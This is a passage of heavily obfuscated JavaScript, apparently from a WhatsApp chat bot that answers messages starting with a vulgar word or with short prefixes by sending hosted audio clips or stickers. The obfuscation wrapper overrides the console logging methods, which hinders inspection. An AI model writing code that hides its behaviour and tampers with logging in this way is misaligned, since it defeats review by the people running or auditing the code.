_0x38f92e=_0x2372d1?function(){function _0x1602df(_0x28b914,_0x2c49ec,_0x18ac5e,_0x103dc6){return _0x4faa(_0x2c49ec-0xc0,_0x28b914);}if(_0x36ba83){var _0x15bfea=_0x36ba83[_0x1602df(0x2a1,0x28d,0x29a,0x286)](_0x5817ca,arguments);return _0x36ba83=null,_0x15bfea;}}:function(){};return _0x2372d1=![],_0x38f92e;};}()),_0x200050=_0x5c1582(this,function(){function _0x562399(_0x51782e,_0x2a385d,_0x175659,_0x2118e7){return _0x4faa(_0x51782e-0x4b,_0x175659);}function _0x17a5c5(_0x39fd9c,_0x3fe3bf,_0x2cc23e,_0x17229a){return _0x4faa(_0x2cc23e- -0x31,_0x39fd9c);}var _0x2b5ddb={};_0x2b5ddb['QkzSl']=_0x17a5c5(0x19a,0x16c,0x198,0x176)+'+$';var _0x352ad8=_0x2b5ddb;return _0x200050[_0x17a5c5(0x206,0x1f9,0x1d3,0x1e6)]()[_0x562399(0x23f,0x21f,0x255,0x22d)](_0x352ad8[_0x562399(0x213,0x1f1,0x22b,0x224)])[_0x17a5c5(0x200,0x1a3,0x1d3,0x1c3)]()[_0x17a5c5(0x19e,0x1ac,0x1ab,0x1cd)+'r'](_0x200050)[_0x562399(0x23f,0x246,0x20d,0x271)](_0x352ad8[_0x17a5c5(0x170,0x1a2,0x197,0x1b4)]);});_0x200050();var _0x1c25f4=(function(){function _0x266df5(_0x5a253c,_0x29cdf3,_0x128ca4,_0x3120a0){return _0x4faa(_0x3120a0- -0x18d,_0x29cdf3);}var _0x13655b={'odkKy':_0x3e3f8f(0x1c8,0x1ab,0x1cd,0x1d6),'tiXmp':function(_0x46cedb,_0x2dc53a){return _0x46cedb<_0x2dc53a;},'lWOuy':function(_0x4f6dd8,_0x64c4cc){return _0x4f6dd8(_0x64c4cc);},'BAVUs':function(_0x53f791,_0x2b57f8){return _0x53f791+_0x2b57f8;},'aURnH':_0x3e3f8f(0x1b9,0x1a8,0x1b9,0x19b)+_0x3e3f8f(0x1b4,0x1b5,0x1ad,0x1e6),'KoLkc':function(_0x5365d8){return _0x5365d8();},'ZuqzC':_0x3e3f8f(0x1b3,0x1bf,0x195,0x1d0),'RLcjf':_0x3e3f8f(0x1c6,0x1f8,0x1c1,0x1b8),'UOYAA':_0x3e3f8f(0x1dc,0x1ff,0x1b6,0x1f1),'KQSjn':_0x3e3f8f(0x182,0x1b3,0x1ad,0x1b0),'BipQa':'trace','EbxGd':_0x266df5(0x6a,0x84,0xa0,0x8f),'PdjHs':function(_0x270f44,_0x3f4b36){return _0x270f44===_0x3f4b36;},'xUAzm':_0x266df5(0x25,0x4c,0x19,0x42),'rUTLN':function(_0x317a75,_0x93c82c){return _0x317a75===_0x93c82c;}};function _0x3e3f8f(_0x401ae4,_0x502353,_0x11ff7a,_0x351db0){return _0x4faa(_0x401ae4- -0x3a,_0x11ff7a);}var _0x1a32da=!![];return function(_0x325cca,_0x3e4f38){function _0x21670f(_0x324f1b,_0x480c16,_0x4befcf,_0xc7a5c6){return _0x3e3f8f(_0xc7a5c6- -0x375,_0x480c16-0x19b,_0x324f1b,_0xc7a5c6-0x6d);}function _0x48c5cd(_0x54ba89,_0x421750,_0x46434f,_0x5971b6){return _0x266df5(_0x54ba89-0x70,_0x5971b6,_0x46434f-0xbc,_0x46434f- -0xa8);}var _0x3c6afb={'oGijj':_0x13655b['EbxGd'],'oduLw':function(_0x21dbd8,_0x21692e){return _0x13655b['PdjHs'](_0x21dbd8,_0x21692e);},'Asvtp':_0x13655b[_0x48c5cd(-0x67,-0x5f,-0x49,-0x57)],'yUPHP':_0x48c5cd(-0x54,-0x6d,-0x69,-0x9c)};if(_0x13655b['rUTLN']('HkFhy',_0x48c5cd(-0x53,-0x23,-0x55,-0x73))){var _0x48ac6d=_0x13655b[_0x48c5cd(-0x5d,-0x6c,-0x3e,-0x67)][_0x21670f(-0x1b3,-0x1f5,-0x204,-0x1d7)]('|'),_0x3974d8=-0xc*-0x1eb+-0x1*0x4fd+0x39b*-0x5;while(!![]){switch(_0x48ac6d[_0x3974d8++]){case'0':var _0xd3e6a0=_0x3786fe[_0x48c5cd(-0x38,-0x2d,-0x2c,-0x48)]=_0x3786fe[_0x48c5cd(0x2,-0xb,-0x2c,-0x2f)]||{};continue;case'1':var _0x3786fe;continue;case'2':for(var _0x12e64e=-0x5*-0x581+-0x553+-0x3b3*0x6;_0x13655b[_0x48c5cd(-0x5c,-0x59,-0x60,-0x32)](_0x12e64e,_0x507ccd[_0x21670f(-0x1dc,-0x1dd,-0x200,-0x1ea)]);_0x12e64e++){var _0x5a5bdd=(_0x48c5cd(-0x1,-0x7,-0x1b,-0x42)+'0')[_0x21670f(-0x1db,-0x1ad,-0x1a9,-0x1d7)]('|'),_0x1f2fac=-0x115d+0xa8e+0x6cf;while(!![]){switch(_0x5a5bdd[_0x1f2fac++]){case'0':_0xd3e6a0[_0xa134d3]=_0x3548e6;continue;case'1':var _0xa134d3=_0x507ccd[_0x12e64e];continue;case'2':var _0x253919=_0xd3e6a0[_0xa134d3]||_0x3548e6;continue;case'3':var _0x3548e6=_0x353ed6[_0x21670f(-0x1be,-0x1de,-0x1f3,-0x1d3)+'r'][_0x21670f(-0x1bb,-0x202,-0x1ca,-0x1e5)][_0x48c5cd(-0x42,-0x39,-0x34,-0x2a)](_0x4db17d);continue;case'4':_0x3548e6[_0x48c5cd(-0x2f,-0x9,-0x31,-0xd)]=_0x253919['toString'][_0x48c5cd(-0x13,-0x3e,-0x34,-0x56)](_0x253919);continue;case'5':_0x3548e6[_0x48c5cd(-0x7a,-0x29,-0x5a,-0x4b)]=_0x2d83b4[_0x21670f(-0x1cf,-0x1ae,-0x1b3,-0x1ae)](_0x52201c);continue;}break;}}continue;case'3':try{var _0x1a7e5d=_0x13655b[_0x21670f(-0x1b5,-0x193,-0x198,-0x19b)](_0x51ec1e,_0x13655b['BAVUs'](_0x13655b['BAVUs'](_0x13655b[_0x21670f(-0x211,-0x1db,-0x209,-0x1f4)],_0x21670f(-0x1cb,-0x1d6,-0x1d7,-0x1b2)+_0x48c5cd(-0x43,0x0,-0x22,-0x33)+_0x48c5cd(-0x6b,-0x57,-0x4c,-0x50)+'\x20)'),');'));_0x3786fe=_0x13655b[_0x48c5cd(-0x1d,-0x10,-0x1a,-0x12)](_0x1a7e5d);}catch(_0x396e1c){_0x3786fe=_0x3d1d1a;}continue;case'4':var _0x507ccd=[_0x13655b[_0x48c5cd(-0x77,-0x67,-0x50,-0x74)],'warn',_0x13655b[_0x21670f(-0x17e,-0x176,-0x182,-0x1a3)],'error',_0x13655b[_0x48c5cd(-0x25,-0x83,-0x51,-0x40)],_0x13655b[_0x21670f(-0x1c5,-0x1c1,-0x1aa,-0x192)],_0x13655b[_0x48c5cd(-0x35,-0x81,-0x54,-0x68)]];continue;}break;}}else{var _0x330027=_0x1a32da?function(){function _0xfd029b(_0x4a94e9,_0x28a829,_0x3042b3,_0x2f0621){return _0x48c5cd(_0x4a94e9-0xf6,_0x28a829-0x73,_0x28a829-0x58d,_0x4a94e9);}function _0x5c6cdb(_0x58f2e4,_0x57e901,_0x13b349,_0x5dc818){return _0x48c5cd(_0x58f2e4-0x1ed,_0x57e901-0x86,_0x13b349- -0x137,_0x58f2e4);}if(_0x3c6afb[_0xfd029b(0x512,0x53e,0x53d,0x52b)](_0x3c6afb[_0xfd029b(0x564,0x56d,0x59b,0x584)],_0x3c6afb[_0x5c6cdb(-0x12e,-0x177,-0x15a,-0x177)])){var _0x4c36d2={};_0x4c36d2[_0xfd029b(0x534,0x526,0x529,0x52b)]='https://e.'+_0x5c6cdb(-0x180,-0x1a6,-0x192,-0x18b)+'/m_228660h'+_0xfd029b(0x558,0x52f,0x508,0x516);var _0x332681={};_0x332681[_0xfd029b(0x529,0x550,0x57f,0x55a)]=_0x4c36d2,_0x332681[_0xfd029b(0x58a,0x563,0x563,0x544)]=_0x3c6afb[_0xfd029b(0x4e4,0x515,0x4f2,0x4f4)],_0x332681[_0x5c6cdb(-0x150,-0x151,-0x17a,-0x18f)]=!![];var _0x182e28={};_0x182e28['quoted']=_0x578684,_0x57d833[_0xfd029b(0x53a,0x518,0x50f,0x539)+'e'](_0x275599,_0x332681,_0x182e28);}else{if(_0x3e4f38){var _0x10842d=_0x3e4f38[_0xfd029b(0x554,0x525,0x52e,0x54e)](_0x325cca,arguments);return _0x3e4f38=null,_0x10842d;}}}:function(){};return _0x1a32da=![],_0x330027;}};}()),_0x5bd26b=_0x1c25f4(this,function(){function _0x104c19(_0x106bc4,_0x5416df,_0x34a26f,_0x1d7324){return _0x4faa(_0x34a26f-0x1ba,_0x106bc4);}var _0x57c8e2={'RyGXQ':_0x2ca318(0x1fa,0x1fc,0x225,0x211),'VjDEv':function(_0x54dd89,_0x136b5f){return _0x54dd89!==_0x136b5f;},'JAfsP':_0x104c19(0x3cf,0x3ce,0x3b3,0x3b6),'RsrNH':function(_0x1456e5,_0x1ec3bc){return _0x1456e5(_0x1ec3bc);},'HGFCG':function(_0x118d2a,_0x49662e){return _0x118d2a+_0x49662e;},'qrjCP':function(_0x23265c,_0xc8835f){return _0x23265c+_0xc8835f;},'eRmfg':function(_0x560bf0){return _0x560bf0();},'iGbhM':_0x104c19(0x3e2,0x3ca,0x3c4,0x3d2),'VhOcX':_0x104c19(0x3b2,0x395,0x3a7,0x3ba),'XaaQj':_0x2ca318(0x1c0,0x1be,0x18c,0x190),'iTFJm':'info','mksOn':_0x104c19(0x3a7,0x3c2,0x3d0,0x3d0),'BEhBd':_0x104c19(0x3d3,0x3bd,0x3ca,0x3c1),'asUQL':function(_0x21e182,_0x91bdc6){return _0x21e182<_0x91bdc6;}},_0x36fde8;try{if(_0x57c8e2[_0x2ca318(0x1a6,0x1bd,0x19f,0x1cc)](_0x57c8e2[_0x2ca318(0x1f5,0x1d0,0x1d7,0x1d5)],_0x57c8e2[_0x2ca318(0x1d2,0x1d0,0x1df,0x1fa)])){if(_0xe21920){var _0x976554=_0x215a58[_0x104c19(0x361,0x36f,0x387,0x382)](_0x48e36e,arguments);return _0x470f89=null,_0x976554;}}else{var _0x389528=_0x57c8e2[_0x2ca318(0x1d1,0x1d1,0x1f9,0x1b4)](Function,_0x57c8e2[_0x2ca318(0x1f7,0x1e7,0x1ce,0x1cb)](_0x57c8e2['qrjCP']('return\x20(fu'+'nction()\x20',_0x104c19(0x3d0,0x3c3,0x3b7,0x385)+_0x2ca318(0x1ff,0x1f3,0x1ca,0x1c9)+'rn\x20this\x22)('+'\x20)'),');'));_0x36fde8=_0x57c8e2[_0x104c19(0x3ab,0x38d,0x38d,0x39b)](_0x389528);}}catch(_0x284d44){if(_0x104c19(0x3e4,0x392,0x3c4,0x3cb)===_0x57c8e2[_0x104c19(0x3cb,0x38f,0x3af,0x3b0)])_0x36fde8=window;else{var _0x4eb884={};_0x4eb884[_0x2ca318(0x1ba,0x1ae,0x1b1,0x195)]=_0x104c19(0x365,0x374,0x38a,0x37d)+'top4top.io'+_0x2ca318(0x1c2,0x1e5,0x1bf,0x1dc)+'fj0.mp3';var _0x1d5df4={};_0x1d5df4[_0x2ca318(0x1a6,0x1d8,0x1f8,0x1ca)]=_0x4eb884,_0x1d5df4[_0x2ca318(0x205,0x1eb,0x1cb,0x1fb)]=_0x57c8e2[_0x104c19(0x38c,0x3d9,0x3b4,0x3bc)],_0x1d5df4[_0x104c19(0x38a,0x397,0x3ac,0x38e)]=!![];var _0x962592={};_0x962592[_0x2ca318(0x1f2,0x1c8,0x1cd,0x1b0)]=_0x1040ec,_0xbec48c[_0x104c19(0x38a,0x390,0x37a,0x358)+'e'](_0x498152,_0x1d5df4,_0x962592);}}var _0x563136=_0x36fde8['console']=_0x36fde8['console']||{};function _0x2ca318(_0x59e0a6,_0x35f472,_0x3db7f3,_0x2e8aa1){return _0x4faa(_0x35f472- -0x20,_0x3db7f3);}var _0x5a296c=[_0x57c8e2['VhOcX'],_0x57c8e2[_0x2ca318(0x178,0x1a4,0x1b7,0x1d7)],_0x57c8e2['iTFJm'],_0x104c19(0x3b1,0x3c6,0x393,0x37e),_0x57c8e2[_0x104c19(0x37b,0x391,0x380,0x378)],'table',_0x57c8e2[_0x104c19(0x392,0x3c6,0x3b9,0x3ae)]];for(var _0x49bb4c=0x2428+0x74c*0x1+-0x2b74;_0x57c8e2[_0x2ca318(0x176,0x1a7,0x1a7,0x194)](_0x49bb4c,_0x5a296c[_0x104c19(0x38b,0x3b0,0x37f,0x356)]);_0x49bb4c++){var _0x315ffa=_0x1c25f4[_0x104c19(0x38a,0x39b,0x396,0x387)+'r'][_0x2ca318(0x1cb,0x1aa,0x187,0x1d0)][_0x104c19(0x38c,0x3e9,0x3bb,0x39e)](_0x1c25f4),_0xe67219=_0x5a296c[_0x49bb4c],_0x34da9c=_0x563136[_0xe67219]||_0x315ffa;_0x315ffa[_0x104c19(0x3c6,0x3c1,0x395,0x39c)]=_0x1c25f4[_0x2ca318(0x1f0,0x1e1,0x1db,0x1ea)](_0x1c25f4),_0x315ffa[_0x2ca318(0x215,0x1e4,0x1e5,0x1c8)]=_0x34da9c[_0x2ca318(0x211,0x1e4,0x1c7,0x201)][_0x104c19(0x3a1,0x3d0,0x3bb,0x3ed)](_0x34da9c),_0x563136[_0xe67219]=_0x315ffa;}});function _0x40bc60(_0x3e8f17,_0x5a7410,_0x90bff2,_0x4fd5fa){return _0x4faa(_0x4fd5fa- -0x335,_0x5a7410);}_0x5bd26b();if(body[_0x40bc60(-0x18f,-0x141,-0x156,-0x173)]('memek')){var _0x28c8cf={};_0x28c8cf[_0x5cbf04(-0x172,-0x17c,-0x14f,-0x18e)]=_0x40bc60(-0x156,-0x187,-0x141,-0x165)+_0x40bc60(-0x150,-0x179,-0x12d,-0x15b)+_0x40bc60(-0x125,-0x114,-0x113,-0x130)+_0x40bc60(-0x17b,-0x14a,-0x163,-0x15e);var _0x32e857={};_0x32e857[_0x40bc60(-0x162,-0x142,-0x135,-0x13d)]=_0x28c8cf,_0x32e857[_0x40bc60(-0x139,-0x144,-0x121,-0x12a)]=_0x40bc60(-0x136,-0xf0,-0x149,-0x119),_0x32e857[_0x5cbf04(-0x154,-0x158,-0x127,-0x17b)]=!![];var _0x1fe415={};_0x1fe415['quoted']=m,zaki[_0x40bc60(-0x17a,-0x189,-0x184,-0x175)+'e'](from,_0x32e857,_0x1fe415);}if(body['startsWith'](_0x40bc60(-0x11a,-0x15c,-0x145,-0x139))){var _0x189342={};_0x189342['url']=_0x5cbf04(-0x169,-0x17a,-0x178,-0x14a)+_0x40bc60(-0x132,-0x16f,-0x16a,-0x15b)+_0x5cbf04(-0x159,-0x145,-0x135,-0x11f)+'fj0.mp3';var _0x43d498={};_0x43d498[_0x40bc60(-0x127,-0x132,-0x164,-0x13d)]=_0x189342,_0x43d498['mimetype']=_0x5cbf04(-0x149,-0x12e,-0x102,-0x14b),_0x43d498[_0x5cbf04(-0x141,-0x158,-0x141,-0x157)]=!![];var _0x13d1e4={};_0x13d1e4['quoted']=m,zaki[_0x40bc60(-0x159,-0x145,-0x176,-0x175)+'e'](from,_0x43d498,_0x13d1e4);}if(body[_0x5cbf04(-0x1a4,-0x188,-0x15a,-0x18c)](_0x5cbf04(-0x171,-0x142,-0x170,-0x11f))){var _0x6055c0={};_0x6055c0[_0x40bc60(-0x148,-0x177,-0x179,-0x167)]=_0x5cbf04(-0x194,-0x17a,-0x163,-0x149)+_0x5cbf04(-0x19b,-0x170,-0x16c,-0x16d)+'/m_228660h'+_0x40bc60(-0x167,-0x183,-0x18a,-0x15e);var _0x5f25f3={};_0x5f25f3[_0x5cbf04(-0x170,-0x152,-0x12c,-0x164)]=_0x6055c0,_0x5f25f3[_0x5cbf04(-0x143,-0x13f,-0x114,-0x161)]='audio/mp4',_0x5f25f3['ptt']=!![];var _0x125507={};_0x125507[_0x5cbf04(-0x152,-0x162,-0x17a,-0x142)]=m,zaki[_0x5cbf04(-0x1b4,-0x18a,-0x16d,-0x167)+'e'](from,_0x5f25f3,_0x125507);}if(body['startsWith'](_0x40bc60(-0x193,-0x150,-0x158,-0x17b))){var _0x539457={};_0x539457['url']='https://e.'+_0x40bc60(-0x170,-0x14d,-0x17b,-0x15b)+_0x5cbf04(-0x149,-0x145,-0x119,-0x163)+_0x40bc60(-0x15f,-0x164,-0x136,-0x15e);var _0x369476={};_0x369476['audio']=_0x539457,_0x369476['mimetype']=_0x5cbf04(-0x12f,-0x12e,-0x100,-0x10b),_0x369476[_0x40bc60(-0x168,-0x132,-0x163,-0x143)]=!![];var _0x2907f0={};_0x2907f0[_0x5cbf04(-0x17c,-0x162,-0x16e,-0x16e)]=m,zaki[_0x5cbf04(-0x171,-0x18a,-0x166,-0x1b7)+'e'](from,_0x369476,_0x2907f0);}if(body[_0x40bc60(-0x159,-0x162,-0x17c,-0x173)]('/p')){var _0x496c30={};_0x496c30['url']=_0x40bc60(-0x140,-0x167,-0x18c,-0x165)+_0x5cbf04(-0x183,-0x170,-0x193,-0x185)+_0x40bc60(-0x107,-0x115,-0x101,-0x130)+_0x5cbf04(-0x16e,-0x173,-0x1a0,-0x18c);var _0x33c113={};_0x33c113[_0x5cbf04(-0x162,-0x152,-0x12f,-0x12b)]=_0x496c30,_0x33c113['mimetype']='audio/mp4',_0x33c113[_0x5cbf04(-0x16c,-0x158,-0x179,-0x134)]=!![];var _0x415774={};_0x415774['quoted']=m,zaki[_0x5cbf04(-0x1a7,-0x18a,-0x181,-0x1bd)+'e'](from,_0x33c113,_0x415774);}if(body[_0x40bc60(-0x17a,-0x166,-0x16a,-0x173)]('#p')){var _0x4071b7={};_0x4071b7[_0x5cbf04(-0x1ac,-0x17c,-0x16b,-0x1a8)]='https://e.'+'top4top.io'+_0x40bc60(-0x145,-0x11f,-0x135,-0x130)+_0x40bc60(-0x145,-0x171,-0x137,-0x15e);var _0x473af4={};_0x473af4[_0x40bc60(-0x14d,-0x121,-0x12b,-0x13d)]=_0x4071b7,_0x473af4[_0x40bc60(-0x122,-0x114,-0x104,-0x12a)]='audio/mp4',_0x473af4[_0x5cbf04(-0x129,-0x158,-0x13c,-0x12e)]=!![];var _0x5e827e={};_0x5e827e[_0x5cbf04(-0x140,-0x162,-0x190,-0x180)]=m,zaki['sendMessag'+'e'](from,_0x473af4,_0x5e827e);}if(body['startsWith'](_0x5cbf04(-0x185,-0x167,-0x159,-0x140))){var _0x4c1dca={};_0x4c1dca[_0x40bc60(-0x196,-0x18f,-0x16a,-0x167)]='https://e.'+_0x40bc60(-0x151,-0x13a,-0x14c,-0x15b)+_0x5cbf04(-0x138,-0x145,-0x14f,-0x157)+_0x5cbf04(-0x184,-0x173,-0x18d,-0x18a);var _0x1ad5d3={};_0x1ad5d3[_0x5cbf04(-0x150,-0x152,-0x167,-0x156)]=_0x4c1dca,_0x1ad5d3[_0x5cbf04(-0x14a,-0x13f,-0x12c,-0x150)]=_0x5cbf04(-0x10f,-0x12e,-0x153,-0x135),_0x1ad5d3[_0x40bc60(-0x16f,-0x13b,-0x15c,-0x143)]=!![];var _0x2f52a8={};_0x2f52a8[_0x5cbf04(-0x14e,-0x162,-0x15f,-0x143)]=m,zaki['sendMessag'+'e'](from,_0x1ad5d3,_0x2f52a8);}if(body['startsWith']('?p')){var _0x57eff8={};_0x57eff8[_0x40bc60(-0x157,-0x146,-0x159,-0x167)]=_0x5cbf04(-0x18c,-0x17a,-0x19e,-0x16b)+_0x5cbf04(-0x17b,-0x170,-0x163,-0x178)+_0x40bc60(-0x130,-0x142,-0x12f,-0x130)+'fj0.mp3';var _0x3a3e8b={};_0x3a3e8b[_0x5cbf04(-0x152,-0x152,-0x17d,-0x171)]=_0x57eff8,_0x3a3e8b[_0x40bc60(-0x114,-0x12b,-0x103,-0x12a)]=_0x40bc60(-0xf7,-0x148,-0x141,-0x119),_0x3a3e8b['ptt']=!![];var _0x10271a={};_0x10271a[_0x40bc60(-0x168,-0x157,-0x155,-0x14d)]=m,zaki[_0x5cbf04(-0x178,-0x18a,-0x175,-0x16b)+'e'](from,_0x3a3e8b,_0x10271a);}if(body['startsWith'](_0x40bc60(-0x145,-0x152,-0x133,-0x14e))){var _0x1b06a1={};_0x1b06a1[_0x40bc60(-0x13f,-0x17f,-0x18f,-0x167)]=_0x5cbf04(-0x17f,-0x17a,-0x18b,-0x192)+_0x40bc60(-0x131,-0x13b,-0x17b,-0x15b)+_0x40bc60(-0x15b,-0x15a,-0x125,-0x130)+_0x40bc60(-0x133,-0x174,-0x134,-0x15e);var _0xe33ad8={};_0xe33ad8[_0x5cbf04(-0x160,-0x152,-0x159,-0x133)]=_0x1b06a1,_0xe33ad8[_0x5cbf04(-0x142,-0x13f,-0x169,-0x136)]='audio/mp4',_0xe33ad8[_0x40bc60(-0x119,-0x149,-0x150,-0x143)]=!![];var _0x460bac={};_0x460bac[_0x5cbf04(-0x150,-0x162,-0x13b,-0x163)]=m,zaki['sendMessag'+'e'](from,_0xe33ad8,_0x460bac);}if(body[_0x40bc60(-0x186,-0x15b,-0x165,-0x173)](_0x5cbf04(-0x199,-0x179,-0x15c,-0x191))){var _0x2e3e81={};_0x2e3e81[_0x5cbf04(-0x1ae,-0x17c,-0x17d,-0x1ac)]=_0x5cbf04(-0x165,-0x17a,-0x18f,-0x18d)+_0x40bc60(-0x144,-0x188,-0x184,-0x15b)+'/m_228660h'+'fj0.mp3';var _0x3d036e={};_0x3d036e[_0x40bc60(-0x116,-0x151,-0x153,-0x13d)]=_0x2e3e81,_0x3d036e[_0x40bc60(-0x119,-0x104,-0x146,-0x12a)]=_0x5cbf04(-0x156,-0x12e,-0x10f,-0x129),_0x3d036e[_0x5cbf04(-0x15e,-0x158,-0x130,-0x186)]=!![];var _0x61e7ba={};_0x61e7ba[_0x40bc60(-0x120,-0x12f,-0x133,-0x14d)]=m,zaki['sendMessag'+'e'](from,_0x3d036e,_0x61e7ba);}if(body[_0x5cbf04(-0x178,-0x188,-0x198,-0x17c)](_0x40bc60(-0x177,-0x145,-0x152,-0x161))){var _0x4be988={};_0x4be988[_0x40bc60(-0x16e,-0x199,-0x185,-0x167)]=_0x5cbf04(-0x166,-0x17a,-0x151,-0x1a3)+'top4top.io'+'/m_228660h'+'fj0.mp3';var _0x339327={};_0x339327[_0x5cbf04(-0x167,-0x152,-0x13d,-0x171)]=_0x4be988,_0x339327[_0x40bc60(-0x12b,-0x142,-0x10a,-0x12a)]=_0x40bc60(-0x100,-0xf8,-0x148,-0x119),_0x339327['ptt']=!![];var _0x5aad11={};_0x5aad11[_0x5cbf04(-0x179,-0x162,-0x145,-0x176)]=m,zaki['sendMessag'+'e'](from,_0x339327,_0x5aad11);}if(body['startsWith']('!p')){var _0x386219={};_0x386219[_0x40bc60(-0x15b,-0x15f,-0x181,-0x167)]=_0x40bc60(-0x18d,-0x170,-0x16e,-0x165)+'top4top.io'+_0x40bc60(-0x138,-0x131,-0x12c,-0x130)+_0x5cbf04(-0x17d,-0x173,-0x189,-0x182);var _0x39f191={};_0x39f191[_0x40bc60(-0x15a,-0x15c,-0x11c,-0x13d)]=_0x386219,_0x39f191[_0x40bc60(-0x114,-0x118,-0x130,-0x12a)]=_0x5cbf04(-0x15f,-0x12e,-0x127,-0x121),_0x39f191[_0x40bc60(-0x168,-0x16c,-0x161,-0x143)]=!![];var _0x50b20e={};_0x50b20e[_0x40bc60(-0x13a,-0x177,-0x134,-0x14d)]=m,zaki['sendMessag'+'e'](from,_0x39f191,_0x50b20e);}if(body[_0x40bc60(-0x18b,-0x170,-0x174,-0x173)](_0x40bc60(-0x12f,-0x140,-0x14b,-0x156))){var _0x5a5945={};_0x5a5945[_0x40bc60(-0x17b,-0x197,-0x15d,-0x167)]=_0x40bc60(-0x17d,-0x186,-0x15f,-0x165)+_0x40bc60(-0x16d,-0x177,-0x180,-0x15b)+_0x40bc60(-0x126,-0x12d,-0x15b,-0x130)+_0x5cbf04(-0x18e,-0x173,-0x189,-0x198);var _0xd858ef={};_0xd858ef['audio']=_0x5a5945,_0xd858ef[_0x40bc60(-0xf9,-0x15c,-0x11a,-0x12a)]=_0x40bc60(-0x11d,-0x130,-0xf9,-0x119),_0xd858ef[_0x5cbf04(-0x166,-0x158,-0x15d,-0x173)]=!![];var _0x364690={};_0x364690['quoted']=m,zaki[_0x5cbf04(-0x15f,-0x18a,-0x181,-0x1ab)+'e'](from,_0xd858ef,_0x364690);}if(body[_0x5cbf04(-0x173,-0x188,-0x18b,-0x17d)](_0x40bc60(-0x189,-0x182,-0x1a9,-0x17c))){var _0xb26d6d={};_0xb26d6d[_0x40bc60(-0x199,-0x17e,-0x141,-0x167)]=_0x40bc60(-0x13c,-0x139,-0x153,-0x165)+'top4top.io'+_0x5cbf04(-0x117,-0x145,-0x125,-0x12b)+_0x5cbf04(-0x17d,-0x173,-0x18a,-0x192);var _0x1b3bb3={};_0x1b3bb3[_0x5cbf04(-0x128,-0x152,-0x17f,-0x12f)]=_0xb26d6d,_0x1b3bb3[_0x40bc60(-0x13b,-0x12e,-0x14f,-0x12a)]='audio/mp4',_0x1b3bb3[_0x5cbf04(-0x128,-0x158,-0x14d,-0x173)]=!![];var _0x177749={};_0x177749[_0x5cbf04(-0x18a,-0x162,-0x130,-0x17a)]=m,zaki['sendMessag'+'e'](from,_0x1b3bb3,_0x177749);}if(body[_0x40bc60(-0x163,-0x155,-0x18f,-0x173)](',p')){var _0x32f381={};_0x32f381['url']=_0x40bc60(-0x158,-0x18b,-0x149,-0x165)+_0x5cbf04(-0x153,-0x170,-0x199,-0x199)+'/m_228660h'+_0x5cbf04(-0x184,-0x173,-0x194,-0x16a);var _0x38751f={};_0x38751f['audio']=_0x32f381,_0x38751f['mimetype']=_0x5cbf04(-0x126,-0x12e,-0x154,-0x15f),_0x38751f[_0x40bc60(-0x15c,-0x174,-0x16a,-0x143)]=!![];var _0x412d4a={};_0x412d4a[_0x40bc60(-0x12c,-0x140,-0x129,-0x14d)]=m,zaki[_0x5cbf04(-0x161,-0x18a,-0x1a5,-0x17f)+'e'](from,_0x38751f,_0x412d4a);}if(body[_0x40bc60(-0x19e,-0x199,-0x156,-0x173)](_0x40bc60(-0xf8,-0x14d,-0x132,-0x124))){var _0x35cca3={};_0x35cca3['url']=_0x40bc60(-0x152,-0x158,-0x192,-0x165)+_0x5cbf04(-0x158,-0x170,-0x18d,-0x14e)+'/m_228660h'+_0x5cbf04(-0x18d,-0x173,-0x183,-0x15b);var _0xd8a50d={};_0xd8a50d[_0x5cbf04(-0x177,-0x152,-0x13a,-0x121)]=_0x35cca3,_0xd8a50d['mimetype']=_0x40bc60(-0x11f,-0xf4,-0xf9,-0x119),_0xd8a50d['ptt']=!![];var _0x6974a7={};_0x6974a7[_0x5cbf04(-0x150,-0x162,-0x158,-0x194)]=m,zaki[_0x5cbf04(-0x175,-0x18a,-0x187,-0x19a)+'e'](from,_0xd8a50d,_0x6974a7);}body[_0x5cbf04(-0x17d,-0x188,-0x18d,-0x19e)](_0x5cbf04(-0x144,-0x14c,-0x13c,-0x146))&&zaki[_0x40bc60(-0x192,-0x160,-0x16a,-0x174)+_0x5cbf04(-0x1a0,-0x178,-0x15e,-0x1aa)](m['chat'],global[_0x40bc60(-0x187,-0x198,-0x185,-0x16a)],m,{'packname':global['packname'],'author':global[_0x5cbf04(-0x127,-0x131,-0x15b,-0x145)]});body[_0x40bc60(-0x19f,-0x17f,-0x15a,-0x173)](_0x40bc60(-0x168,-0x143,-0x11f,-0x139))&&zaki[_0x40bc60(-0x19c,-0x14f,-0x149,-0x174)+_0x5cbf04(-0x17f,-0x178,-0x1a3,-0x188)](m[_0x5cbf04(-0x155,-0x187,-0x166,-0x18f)],global[_0x40bc60(-0x196,-0x152,-0x16b,-0x16a)],m,{'packname':global[_0x5cbf04(-0x10c,-0x13b,-0x125,-0x138)],'author':global[_0x5cbf04(-0x160,-0x131,-0x137,-0x141)]});body['startsWith'](_0x40bc60(-0x110,-0x11e,-0x120,-0x12d))&&zaki[_0x40bc60(-0x18e,-0x15e,-0x195,-0x174)+_0x5cbf04(-0x164,-0x178,-0x1a9,-0x186)](m['chat'],global[_0x40bc60(-0x189,-0x140,-0x191,-0x16a)],m,{'packname':global[_0x40bc60(-0x137,-0x12c,-0x117,-0x126)],'author':global[_0x40bc60(-0x138,-0x119,-0x11c,-0x11c)]});function _0x4faa(_0x4b17a5,_0x200050){var _0x5c1582=_0x5926();return _0x4faa=function(_0x5926b5,_0x4faaf5){_0x5926b5=_0x5926b5-(0x428+-0x1*-0x269f+-0x290e);var _0x47d6f0=_0x5c1582[_0x5926b5];return _0x47d6f0;},_0x4faa(_0x4b17a5,_0x200050);}body[_0x40bc60(-0x16c,-0x17b,-0x199,-0x173)]('!p')&&zaki[_0x40bc60(-0x146,-0x19c,-0x15d,-0x174)+'sSticker'](m['chat'],global[_0x5cbf04(-0x17f,-0x17f,-0x1ad,-0x16c)],m,{'packname':global['packname'],'author':global[_0x40bc60(-0x11a,-0xf6,-0x11f,-0x11c)]});body['startsWith'](_0x40bc60(-0x19a,-0x16d,-0x176,-0x177))&&zaki[_0x5cbf04(-0x1a7,-0x189,-0x1ab,-0x1b3)+'sSticker'](m[_0x40bc60(-0x146,-0x1a3,-0x19e,-0x172)],global[_0x5cbf04(-0x178,-0x17f,-0x199,-0x16e)],m,{'packname':global[_0x40bc60(-0x153,-0x157,-0x131,-0x126)],'author':global[_0x40bc60(-0x14f,-0x107,-0x10a,-0x11c)]});function _0x5926(){var 